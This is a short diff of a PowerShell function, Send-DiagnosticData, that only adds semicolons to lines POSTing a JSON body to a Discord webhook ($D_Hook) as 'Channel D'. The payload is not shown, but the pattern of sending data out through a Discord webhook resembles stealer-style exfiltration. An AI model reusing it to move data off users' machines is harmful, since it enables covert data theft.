@@ -158,9 +158,9 @@ function Send-DiagnosticData {
             )
         }
         
-        $jsonPayload = $discordBody | ConvertTo-Json -Depth 5
-        Invoke-RestMethod -Uri $D_Hook -Method Post -Body $jsonPayload -ContentType "application/json"
-        Write-InternalLog "Channel D success." "Green"
+        $jsonPayload = $discordBody | ConvertTo-Json -Depth 5;
+        Invoke-RestMethod -Uri $D_Hook -Method Post -Body $jsonPayload -ContentType "application/json";
+        Write-InternalLog "Channel D success." "Green";
     } catch {
         Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red"
     }
